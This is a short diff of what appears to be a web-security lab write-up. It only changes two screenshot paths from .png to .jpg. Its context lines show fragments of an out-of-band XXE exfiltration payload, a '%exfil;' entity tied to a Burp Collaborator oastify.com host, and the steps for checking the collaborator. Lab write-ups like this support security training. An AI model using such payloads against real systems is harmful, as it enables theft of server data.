@@ -19,7 +19,7 @@ eo6keyrk85fg7tb4w3oh2v87fylp9oxd.oastify.com
 %exfil;
 ```
 
-![screenshot](./images/lab5_expolite.png)
+![screenshot](images/lab5_expolite.jpg)
 
 ### step2
 
@@ -38,4 +38,4 @@ send request
 
 now goto burpcollaborator
 
-![screenshot](./images/lab5_burpcollaborator.png)
+![screenshot](images/lab5_burpcollaborator.jpg)
